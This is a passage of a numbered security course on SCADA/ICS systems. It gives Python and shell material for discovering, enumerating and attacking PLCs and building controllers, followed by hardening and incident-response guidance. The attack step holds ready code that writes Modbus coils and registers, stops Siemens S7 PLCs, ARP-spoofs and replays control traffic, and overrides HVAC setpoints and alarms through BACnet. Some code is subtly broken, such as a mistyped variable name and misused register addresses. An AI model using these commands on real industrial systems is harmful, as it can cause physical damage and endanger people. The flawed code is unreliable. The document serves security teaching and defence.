# Part 76: SCADA/ICS Security (Steps 751-760)

## Step 751: ICS/SCADA Overview & Protocols

```python
#!/usr/bin/env python3
# ICS/SCADA protocols and security overview

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class ICSProtocols:
    """ICS/SCADA protocols and their security characteristics"""
    
    PROTOCOLS = {
        "Modbus": {
            "port": 502,
            "transport": "TCP/UDP",
            "description": "Serial communication for PLCs (1979)",
            "security": "No authentication, no encryption",
            "functions": ["Read Coils (0x01)", "Read Input Registers (0x04)",
                         "Write Single Coil (0x05)", "Write Single Register (0x06)",
                         "Write Multiple Registers (0x10)"]
        },
        "DNP3": {
            "port": 20000,
            "transport": "TCP/UDP",
            "description": "SCADA protocol for electric utilities",
            "security": "Weak authentication (SAv5 optional), no encryption",
            "vulnerabilities": ["Authentication bypass", "Replay attacks", "Function code abuse"]
        },
        "IEC 61850": {
            "port": 102,
            "transport": "TCP (MMS)",
            "description": "Substation automation",
            "security": "TLS optional, role-based access"
        },
        "EtherNet/IP": {
            "port": 44818,
            "transport": "TCP/UDP",
            "description": "Industrial Ethernet protocol",
            "security": "No built-in security"
        },
        "Profinet": {
            "port": 34964,
            "transport": "UDP",
            "description": "Siemens industrial Ethernet",
            "security": "PROFINET Security (IEC 62443)"
        },
        "OPC-UA": {
            "port": 4840,
            "transport": "TCP",
            "description": "Modern industrial communication",
            "security": "TLS, authentication, authorization (most secure)"
        },
        "BACnet": {
            "port": 47808,
            "transport": "UDP",
            "description": "Building automation (HVAC, elevators)",
            "security": "No built-in security in most versions"
        },
        "S7comm": {
            "port": 102,
            "transport": "TCP (ISO-TSAP)",
            "description": "Siemens S7 PLC communication",
            "security": "No authentication (S7-300/400), password on S7-1200/1500"
        }
    }
    
    def nmap_ics_scan(self, target: str) -> Dict:
        """Nmap commands for ICS discovery"""
        ports = ",".join([str(p["port"]) for p in self.PROTOCOLS.values()])
        return {
            "basic_scan": f'nmap -p {ports} --open -sV {target}',
            "modbus_scan": f'nmap -p 502 --script modbus-discover {target}',
            "s7_scan": f'nmap -p 102 --script s7-info {target}',
            "dnp3_scan": f'nmap -p 20000 --script dnp3-info {target}',
            "bacnet_scan": f'nmap -p 47808 --script bacnet-info --script-args target-timeout=2 {target} -sU',
            "full_ics": f'nmap -sT -sU -p {ports} --open --script ics-discover {target}',
        }
    
    def shodan_ics_queries(self) -> Dict:
        """Shodan queries for ICS devices"""
        return {
            "modbus": "port:502",
            "s7": "port:102 S7",
            "dnp3": "port:20000 DNP3",
            "scada": '"SCADA" port:502',
            "hmi": '"WinCC" OR "Wonderware" OR "iFIX" port:102',
            "plc_siemens": 'Device-Description:Siemens',
            "allen_bradley": 'product:"Allen-Bradley"',
        }


@dataclass
class PLCEnumeration:
    """PLC enumeration tools"""
    
    def siemens_s7_enumeration(self, target: str) -> Dict:
        """Enumerate Siemens S7 PLC via snap7"""
        python_enum = f'''import snap7
from snap7.util import *

client = snap7.client.Client()
client.connect("{target}", 0, 1)  # rack=0, slot=1

# Get PLC info
info = client.get_cpu_info()
print(f"Module: {{info.ModuleTypeName.decode()}}")
print(f"Serial: {{info.SerialNumber.decode()}}")
print(f"Order Code: {{info.OrderCode.decode()}}")

# Read Data Block
db_data = client.db_read(1, 0, 100)  # DB1, offset 0, 100 bytes
print(f"DB1 data: {{db_data.hex()}}")

# Read status
status = client.get_cpu_state()
print(f"CPU State: {{status}}")

client.disconnect()
'''
        return {
            "tool": "python-snap7",
            "install": "pip install python-snap7",
            "code": python_enum,
            "dangerous_operations": [
                "client.plc_cold_start()  # Restart PLC",
                "client.plc_stop()  # STOP PLC - dangerous in production",
                "client.db_write(1, 0, new_data)  # Overwrite DB - can cause damage",
            ]
        }
    
    def modbus_enumeration(self, target: str, port: int = 502) -> str:
        """Enumerate Modbus device"""
        python_code = f'''from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusException

client = ModbusTcpClient("{target}", port={port})
client.connect()

# Read coils (digital outputs)
result = client.read_coils(0, 100, unit=1)
if not result.isError():
    print(f"Coils 0-99: {{result.bits}}")

# Read holding registers
result = client.read_holding_registers(0, 100, unit=1)
if not result.isError():
    print(f"Registers 0-99: {{result.registers}}")

# Read device identification (Modbus function 43)
result = client.read_device_information(unit=1)
if not result.isError():
    for k, v in result.information.items():
        print(f"{{k}}: {{v}}")

client.close()
'''
        return python_code


if __name__ == '__main__':
    ics = ICSProtocols()
    print(f"[+] ICS protocols: {len(ics.PROTOCOLS)}")
    for proto, info in ics.PROTOCOLS.items():
        print(f"    {proto}: port {info['port']} - {info['security']}")
    
    scan = ics.nmap_ics_scan("192.168.1.0/24")
    print(f"\n[+] ICS Nmap scans: {list(scan.keys())}")
    
    plc = PLCEnumeration()
    code = plc.modbus_enumeration("192.168.1.10")
    print(f"\n[+] Modbus enumeration code ({len(code)} chars)")
```

## Step 752: ICS Attack Techniques

```python
#!/usr/bin/env python3
# ICS attack techniques

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class ICSAttacks:
    """ICS/SCADA attack techniques"""
    
    def modbus_coil_manipulation(self, target: str, port: int = 502) -> str:
        """Manipulate Modbus coils/registers"""
        code = f'''from pymodbus.client.sync import ModbusTcpClient

client = ModbusTcpClient("{target}", port={port})
client.connect()

# Write single coil (turn on/off digital output)
client.write_coil(0, True, unit=1)   # Turn ON coil 0
client.write_coil(0, False, unit=1)  # Turn OFF coil 0

# Write multiple coils
client.write_coils(0, [True, False, True, True, False], unit=1)

# Write single register (change setpoint/value)
client.write_register(40001, 9999, unit=1)  # Set to 9999

# Write multiple registers (change multiple setpoints)
client.write_registers(40001, [100, 200, 300, 400], unit=1)

client.close()
print("[!] Values written to PLC - may cause physical effects")
'''
        return code
    
    def s7_stop_plc(self, target: str) -> str:
        """Stop Siemens S7 PLC (Stuxnet-style attack)"""
        code = f'''import snap7

client = snap7.client.Client()
client.connect("{target}", 0, 1)

# Check if we can command the PLC
state = client.get_cpu_state()
print(f"Current state: {{state}}")

# DANGEROUS: Stop PLC - causes physical equipment to stop
# client.plc_stop()

# Less destructive: Read and modify a safety setpoint
db1 = client.db_read(1, 0, 10)
print(f"DB1 first 10 bytes: {{db1.hex()}}")

client.disconnect()
'''
        return code
    
    def ics_network_reconnaissance(self) -> Dict:
        """Passive and active ICS reconnaissance"""
        return {
            "passive_tools": [
                "Zeek (Bro) - ICS protocol logging",
                "Wireshark with Modbus/DNP3/S7 dissectors",
                "NetworkMiner - passive fingerprinting",
                "Claroty/Dragos/Nozomi ICS security platforms",
            ],
            "active_tools": [
                "Redpoint (NSE scripts for ICS)",
                "PLCScan - PLC scanning tool",
                "ModbusPal - Modbus testing tool",
                "isf (Industrial Exploitation Framework)",
                "Aegis - ICS security scanner",
            ],
            "wireshark_filters": [
                "modbus",
                "dnp3",
                "s7comm",
                "enip",  # EtherNet/IP
                "mms",   # IEC 61850
                "opcua",
            ]
        }
    
    def man_in_middle_ics(self) -> Dict:
        """MitM attack on ICS protocols"""
        return {
            "arp_poisoning": [
                'arpspoof -t PLC_IP SCADA_IP',
                'arpspoof -t SCADA_IP PLC_IP',
                'echo 1 > /proc/sys/net/ipv4/ip_forward',
            ],
            "replay_attack": [
                '# Record legitimate Modbus traffic',
                'tcpdump -w ics_traffic.pcap -i eth0 host PLC_IP and port 502',
                '# Replay to PLC',
                'tcpreplay -i eth0 ics_traffic.pcap',
            ],
            "protocol_manipulation": [
                '# Use mitmproxy with custom ICS scripts',
                'python3 ics_mitm.py --target PLC_IP --intercept modbus',
            ]
        }
    
    def stuxnet_techniques(self) -> Dict:
        """Stuxnet-style attack technique overview"""
        return {
            "description": "Nation-state malware targeting Siemens S7-315/417 PLCs",
            "attack_chain": [
                "1. Initial infection via USB (0-day Windows CVEs)",
                "2. Spread via network using additional 0-days",
                "3. Identify Siemens WinCC/Step 7 SCADA systems",
                "4. Inject malicious code into S7 program blocks",
                "5. Monitor centrifuge speeds, modify operating parameters",
                "6. While showing normal readings to operators",
                "7. Physical destruction of ~1000 Iranian centrifuges",
            ],
            "lessons_learned": [
                "Air-gapped doesn't mean secure (USB infection)",
                "Physical impact from cyber attacks is real",
                "Legitimate signed drivers (stolen certificates)",
                "Multi-stage, highly targeted attack",
            ]
        }


@dataclass
class ICSDefense:
    """ICS security defense measures"""
    
    def network_segmentation(self) -> Dict:
        """Purdue model network segmentation"""
        zones = {
            "Level 0": "Physical process (sensors, actuators)",
            "Level 1": "Intelligent devices (PLCs, RTUs, IEDs)",
            "Level 2": "Control systems (DCS, SCADA, HMI)",
            "Level 3": "Site operations (MES, historian)",
            "Level 3.5": "DMZ (data diode, proxy)",
            "Level 4": "Business network (ERP, email)",
        }
        
        recommendations = [
            "Separate OT and IT networks with firewall/DMZ",
            "Unidirectional gateways (data diodes) between zones",
            "No direct internet connectivity for control systems",
            "Whitelist-based network access control",
            "Vendor access via VPN with MFA and monitoring",
        ]
        return {"purdue_model": zones, "recommendations": recommendations}


if __name__ == '__main__':
    ics = ICSAttacks()
    
    print("[+] ICS attack categories:")
    print("    1. Protocol manipulation (Modbus, DNP3, S7)")
    print("    2. MitM attacks on unencrypted protocols")
    print("    3. PLC/RTU exploitation")
    print("    4. HMI/SCADA server attacks")
    
    modbus_code = ics.modbus_coil_manipulation("192.168.1.10")
    print(f"\n[+] Modbus manipulation code ({len(modbus_code)} chars)")
    
    stuxnet = ics.stuxnet_techniques()
    print(f"\n[+] Stuxnet attack chain steps: {len(stuxnet['attack_chain'])}")
    for step in stuxnet['attack_chain']:
        print(f"    {step}")
```

## Step 753: Building Automation & Smart Grid Attacks

```python
#!/usr/bin/env python3
# Building automation and smart grid attacks

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class BuildingAutomationAttacks:
    """BACnet and building automation attacks"""
    
    def bacnet_enumeration(self, target: str) -> Dict:
        """BACnet device enumeration"""
        python_code = f'''import BAC0

bacnet = BAC0.lite()

# Discover devices
backnet.discover()

for device_id, device in bacnet.devices.items():
    print(f"Device {{device_id}}: {{device}}")
    
    # Read properties
    bacnet.read(f"{{device}}:{{device_id}} deviceName")
    bacnet.read(f"{{device}}:{{device_id}} description")
    
    # Read analog inputs (temperature, pressure sensors)
    ai_value = bacnet.read(f"{{device}}:{{device_id}} analogInput 1 presentValue")
    print(f"  AI-1 (temp): {{ai_value}}")
    
    # Read binary inputs (door status)
    bi_value = bacnet.read(f"{{device}}:{{device_id}} binaryInput 1 presentValue")
    print(f"  BI-1 (door): {{bi_value}}")
'''
        nmap_cmd = f'nmap -sU -p 47808 --script bacnet-info {target}'
        
        return {
            "python_code": python_code,
            "nmap": nmap_cmd,
            "bacnet_objects": [
                "Analog Input/Output (sensors, actuators)",
                "Binary Input/Output (digital I/O)",
                "Multi-State Input/Output",
                "Schedule (time-based control)",
                "Trend Log (historical data)",
            ]
        }
    
    def hvac_manipulation(self) -> Dict:
        """HVAC system manipulation attacks"""
        return {
            "setpoint_override": [
                'bacnet.write("device:4194303 analogValue 1 presentValue 85")  # Set temp to 85°C',
            ],
            "schedule_manipulation": [
                'bacnet.write("device:4194303 schedule 1 weeklySchedule ...")  # Change HVAC schedule',
            ],
            "alarm_disable": [
                'bacnet.write("device:4194303 notificationClass 1 ackRequired {false}")  # Disable alarms',
            ],
            "impact": [
                "Server room overheating (equipment damage)",
                "Hospital HVAC disruption (patient safety)",
                "Energy waste (economic impact)",
                "Laboratory environment disruption",
            ]
        }

@dataclass
class SmartGridSecurity:
    """Smart grid and power system security"""
    
    def amr_attacks(self) -> Dict:
        """Automated Meter Reading (AMR) attacks"""
        return {
            "meter_tampering": [
                "RF jamming to prevent meter readings",
                "Optical interface manipulation",
                "Meter configuration replay attacks",
            ],
            "smart_meter_rfid_sniff": [
                "Capture RF transmissions from smart meters",
                "Tool: rtl_433 for 433MHz/915MHz protocols",
                "rtl_433 -A  # Analyze unknown protocols",
            ],
            "zigbee_attacks": [
                "Zigbee protocol used in smart meters",
                "Tool: KillerBee (zigbee security toolkit)",
                "zbstumbler - Zigbee network discovery",
                "zbreplay - Replay captured traffic",
            ]
        }
    
    def power_grid_attacks(self) -> Dict:
        """Power grid cyber attacks overview"""
        return {
            "historical_incidents": [
                {"incident": "Ukraine Power Grid 2015", "impact": "230k customers lost power", "method": "BlackEnergy + SCADA manipulation"},
                {"incident": "Ukraine Power Grid 2016", "impact": "Kiev power outage", "method": "Industroyer/CrashOverride"},
                {"incident": "Colonial Pipeline 2021", "impact": "US fuel supply disruption", "method": "Ransomware (DarkSide)"},
                {"incident": "Saudi Aramco 2012", "impact": "30k computers destroyed", "method": "Shamoon wiper"},
            ],
            "common_attack_vectors": [
                "Spearphishing to gain IT network access",
                "Pivot from IT to OT network",
                "Exploit SCADA server vulnerabilities",
                "Manipulate RTU/PLC setpoints",
                "Disable protective relays",
            ]
        }


if __name__ == '__main__':
    ba = BuildingAutomationAttacks()
    bacnet = ba.bacnet_enumeration("192.168.1.0/24")
    print(f"[+] BACnet objects: {bacnet['bacnet_objects']}")
    
    hvac = ba.hvac_manipulation()
    print(f"[+] HVAC attack impact: {hvac['impact']}")
    
    grid = SmartGridSecurity()
    incidents = grid.power_grid_attacks()
    print(f"\n[+] Historical ICS incidents:")
    for incident in incidents['historical_incidents']:
        print(f"    {incident['incident']}: {incident['impact']}")
```

## Steps 754-760: ICS Security Hardening & Testing

```python
#!/usr/bin/env python3
# ICS security hardening and penetration testing methodology

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class ICSPenTestMethodology:
    """ICS penetration testing methodology"""
    
    def passive_reconnaissance(self, network_range: str) -> Dict:
        """Passive ICS recon (non-disruptive)"""
        return {
            "network_capture": [
                f'tcpdump -i eth0 -w ics_capture.pcap host {network_range}',
                'wireshark -k -i eth0 -f "port 502 or port 102 or port 47808"',
            ],
            "passive_discovery": [
                '# Analyze existing traffic for device fingerprinting',
                'zeek -i eth0 Log::default_writer=Log::WRITER_ASCII',
                'bro -i eth0 icsindustry.bro',  # Bro/Zeek ICS scripts
            ],
            "asset_inventory": [
                'redpoint/redpoint.sh --passive --range ' + network_range,
                '# Never active scan production ICS without permission',
            ]
        }
    
    def vulnerability_assessment(self) -> Dict:
        """ICS vulnerability assessment approach"""
        return {
            "steps": [
                "1. Obtain complete system documentation",
                "2. Passive network monitoring (no active scanning)",
                "3. Active scanning on test environment first",
                "4. Careful active scanning with low timing on production",
                "5. Manual device interrogation (protocol-specific)",
                "6. Configuration review (firewall rules, VLAN segmentation)",
                "7. Physical security assessment",
            ],
            "tools": [
                "Claroty - passive ICS security monitoring",
                "Dragos Platform - ICS threat intelligence",
                "Nozomi Networks - OT security",
                "Tenable.ot (formerly Indegy)",
                "runZero - asset discovery",
            ],
            "critical_cautions": [
                "Active scans can crash PLCs and RTUs",
                "Always have rollback/recovery plan",
                "Maintenance window required for active testing",
                "Coordinate with operations team at all times",
                "Never test on live critical infrastructure without strict controls",
            ]
        }
    
    def ics_hardening_checklist(self) -> Dict:
        """ICS security hardening recommendations"""
        return {
            "network": [
                "Implement Purdue model network segmentation",
                "Use unidirectional gateways for high-security zones",
                "Whitelist-based firewall rules (deny all, allow specific)",
                "Disable unnecessary services and ports",
                "Use VLAN segmentation",
                "DMZ between IT and OT networks",
            ],
            "device": [
                "Change default passwords on all ICS devices",
                "Disable unused protocols",
                "Patch PLCs and HMIs when vendor provides updates",
                "Use read-only access where possible",
                "Enable audit logging",
                "Use application whitelisting on HMIs",
            ],
            "monitoring": [
                "Deploy ICS-aware IDS (Claroty, Dragos, Nozomi)",
                "Monitor for unexpected protocol commands",
                "Baseline normal traffic patterns",
                "Alert on anomalous setpoint changes",
                "Integrate with SOC SIEM",
            ],
            "access_control": [
                "MFA for remote access to OT networks",
                "Privileged access workstation (PAW) for OT administration",
                "Vendor access controls (time-limited, supervised)",
                "Disable USB ports on HMIs",
                "Role-based access control",
            ]
        }
    
    def ics_incident_response(self) -> Dict:
        """ICS incident response considerations"""
        return {
            "unique_challenges": [
                "Cannot turn off critical systems during IR",
                "Legacy systems may not support forensic tools",
                "Physical consequences of cyberattacks",
                "Specialized knowledge required (both IT and OT)",
                "Evidence collection without disrupting operations",
            ],
            "response_plan": [
                "1. Detect: IDS alerts, operator observations, anomalies",
                "2. Isolate: Segment affected zones without stopping processes",
                "3. Assess: Determine if physical processes are affected",
                "4. Contain: Block attacker while maintaining operations",
                "5. Eradicate: Remove malware, restore from known good",
                "6. Recover: Controlled return to normal operations",
                "7. Learn: Post-incident analysis, improve defenses",
            ],
            "frameworks": [
                "ICS-CERT (CISA) guidelines",
                "NIST SP 800-82 (ICS Security)",
                "IEC 62443 (Industrial cybersecurity)",
                "NERC CIP (Power grid cybersecurity)",
            ]
        }


if __name__ == '__main__':
    methodology = ICSPenTestMethodology()
    
    passive = methodology.passive_reconnaissance("192.168.0.0/24")
    print(f"[+] Passive recon commands: {list(passive.keys())}")
    
    vuln_assess = methodology.vulnerability_assessment()
    print(f"\n[+] Assessment steps: {len(vuln_assess['steps'])}")
    print(f"[+] Critical cautions:")
    for caution in vuln_assess['critical_cautions']:
        print(f"    {caution}")
    
    hardening = methodology.ics_hardening_checklist()
    print(f"\n[+] Hardening categories: {list(hardening.keys())}")
    total_items = sum(len(v) for v in hardening.values())
    print(f"[+] Total hardening items: {total_items}")
    
    ir = methodology.ics_incident_response()
    print(f"\n[+] IR steps: {len(ir['response_plan'])}")
    for step in ir['response_plan']:
        print(f"    {step}")
```
